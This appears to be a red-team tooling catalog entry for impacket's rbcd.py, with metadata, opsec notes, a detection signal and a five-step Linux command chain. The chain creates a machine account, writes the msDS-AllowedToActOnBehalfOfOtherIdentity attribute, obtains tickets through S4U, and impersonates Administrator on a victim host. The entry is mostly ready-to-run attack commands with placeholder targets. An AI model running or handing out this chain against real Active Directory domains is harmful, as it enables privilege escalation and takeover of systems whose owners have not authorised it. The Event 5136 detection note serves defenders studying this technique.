---
name: impacket-rbcd / rbcd-attack
category: acl-abuse
subcategories: [rbcd, msds-allowedtoact, python, linux-side]
tradecraft_tags: [rbcd, delegation, impacket, python, linux-side, allowedtoact]
mitre_attack:
  - id: T1098
    name: Account Manipulation
source:
  url: https://github.com/fortra/impacket
  license: Apache-2.0
  maintained: true
binary_type: python-script
binary_filename: rbcd.py
supported_os: [linux]
architecture: [x64]
privilege_required: domain-user
network_required: true
detection_signal: |
  Writes to msDS-AllowedToActOnBehalfOfOtherIdentity generate Event 5136 (directory
  service object modification). Same detection surface as StandIn's --rbcd flag but
  executed from Linux infrastructure.
usage_examples:
  - description: Write RBCD attribute on target computer (Linux-side)
    args: "rbcd.py -action write -delegate-from mypc01$ -delegate-to VICTIM$ DOMAIN/user:password -dc-ip DC_IP"
  - description: Read current RBCD attribute on target
    args: "rbcd.py -action read -delegate-to VICTIM$ DOMAIN/user:password -dc-ip DC_IP"
  - description: Remove RBCD entry (cleanup)
    args: "rbcd.py -action remove -delegate-from mypc01$ -delegate-to VICTIM$ DOMAIN/user:password -dc-ip DC_IP"
opsec_notes: |
  Python/Linux equivalent of StandIn's --rbcd flag. Use when operating from Linux
  infrastructure and GenericWrite on the target computer object is held. For Apollo
  engagements, StandIn is preferred. The LDAP write still generates Event 5136.
gotchas: |
  Python-only. Machine account (mypc01$) must exist before writing RBCD — create with
  addcomputer.py first. The `-delegate-from` account must be a security principal with
  an SPN (machine accounts have auto-generated SPNs).
related_ttps: [standin, impacket-addcomputer, impacket-gettst, rbcd-abuse]
alternatives: [standin-rbcd, sharpallowedtoact]
common_args:
  -action:
    description: read, write, or remove
    typical_values: [read, write, remove]
    required: true
  -delegate-from:
    description: Account to grant delegation FROM (the attacker-controlled machine account)
    typical_values: ["mypc01$"]
    required: true
  -delegate-to:
    description: Target computer account to write delegation ON
    typical_values: ["VICTIM$", "WINTERFELL$"]
    required: true
  -dc-ip:
    description: Domain controller IP
    typical_values: ["192.168.56.10"]
    required: true
last_updated: 2026-05-29
---

# impacket-rbcd

impacket's `rbcd.py` — Python-side RBCD attribute manipulation. Reads and writes
the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on computer objects for
Resource-Based Constrained Delegation setup from Linux infrastructure.

## Linux-Side RBCD Full Chain

```bash
# Step 1: Create machine account:
addcomputer.py -computer-name mypc01 -computer-pass 'P@ssw0rd1!' DOMAIN/user:pass

# Step 2: Write RBCD:
rbcd.py -action write -delegate-from mypc01$ -delegate-to VICTIM$ DOMAIN/user:pass -dc-ip DC_IP

# Step 3: Get TGT for new machine account:
getTGT.py DOMAIN/mypc01$:'P@ssw0rd1!' -dc-ip DC_IP

# Step 4: S4U chain:
KRB5CCNAME=mypc01.ccache getST.py -spn cifs/VICTIM.DOMAIN -impersonate Administrator DOMAIN/mypc01$:'P@ssw0rd1!'

# Step 5: Use ticket:
KRB5CCNAME=Administrator@cifs_VICTIM.ccache smbclient.py DOMAIN/Administrator@VICTIM -k -no-pass
```

## Apollo-specific note
Python/Linux only. For Apollo: use StandIn for combined machine account creation + RBCD write.
